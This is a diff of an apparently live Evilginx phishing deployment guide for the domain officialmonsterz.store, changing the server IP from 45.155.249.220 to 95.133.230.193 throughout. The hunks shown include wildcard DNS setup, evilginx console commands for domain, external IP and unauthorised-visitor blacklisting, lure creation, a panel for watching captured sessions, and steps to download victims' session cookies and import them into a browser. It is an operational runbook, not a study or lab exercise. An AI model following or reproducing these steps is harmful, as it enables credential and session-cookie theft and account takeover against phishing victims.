@@ -1,6 +1,6 @@
 
-# EVILGINX — COMPLETE DOCKER DEPLOYMENT GUIDE (v9)
-## Domain: officialmonsterz.store | Server IP: 45.155.249.220
+# EVILGINX — COMPLETE DOCKER DEPLOYMENT GUIDE
+## Domain: officialmonsterz.store | Server IP: 95.133.230.193
 
 Follow the steps **IN ORDER**. Every step has the exact commands to type
 and the exact result you should see before moving on. If you can read
@@ -20,19 +20,19 @@ working; Step 7 shows how to control it.
 
    | Type | Host | Value | TTL |
    |------|------|-------|-----|
-   | A Record | @ | 45.155.249.220 | 5 min |
-   | A Record | * | 45.155.249.220 | 5 min |
+   | A Record | @ | 95.133.230.193 | 5 min |
+   | A Record | * | 95.133.230.193 | 5 min |
 
    (`*` = wildcard — **MANDATORY**; every phishlet uses subdomains)
 
 4. Wait ~5 minutes, then on the VPS:
 
 ```bash
-dig +short officialmonsterz.store            # must say: 45.155.249.220
-dig +short random123.officialmonsterz.store  # must say: 45.155.249.220
+dig +short officialmonsterz.store            # must say: 95.133.230.193
+dig +short random123.officialmonsterz.store  # must say: 95.133.230.193
 ```
 
-✅ Both must return `45.155.249.220`. If not, wait 5 more minutes and retry.
+✅ Both must return `95.133.230.193`. If not, wait 5 more minutes and retry.
 
 ---
 
@@ -365,7 +365,7 @@ NEVER use Ctrl-c or type `exit` in the console — that stops evilginx.
 
 Your login is in `.env`: `WEBAPI_USER` / `WEBAPI_PASS`.
 
-1. Open `http://45.155.249.220:8082` in your browser → the login page.
+1. Open `http://95.133.230.193:8082` in your browser → the login page.
 2. Log in with the `.env` values. You land straight on the dashboard —
    no forced password-change prompt.
 3. What you can do in the panel:
@@ -410,7 +410,7 @@ docker compose attach evilginx
 Then type:
 ```
 config domain officialmonsterz.store
-config ipv4 external 45.155.249.220
+config ipv4 external 95.133.230.193
 blacklist unauth
 config strip_headers on
 ```
@@ -418,7 +418,7 @@ config strip_headers on
 Expected replies:
 ```
 [inf] server domain set to: officialmonsterz.store
-[inf] server external IP set to: 45.155.249.220
+[inf] server external IP set to: 95.133.230.193
 [inf] blacklist mode set to: unauth
 ```
 
@@ -510,8 +510,8 @@ Lures → Create → get URL.
      the phishlet's fault.
 5. Watch captures live:
    - Attached console (`sessions` for details, `sessions <id>` for full data)
-   - `http://45.155.249.220:8082` (full panel — recommended)
-   - `http://45.155.249.220:5000` (simple view)
+   - `http://95.133.230.193:8082` (full panel — recommended)
+   - `http://95.133.230.193:5000` (simple view)
 6. Download cookies from the panel: Sessions → Download (`cookies_N.json`)
    — import into your browser with a Cookie-Editor extension.
 
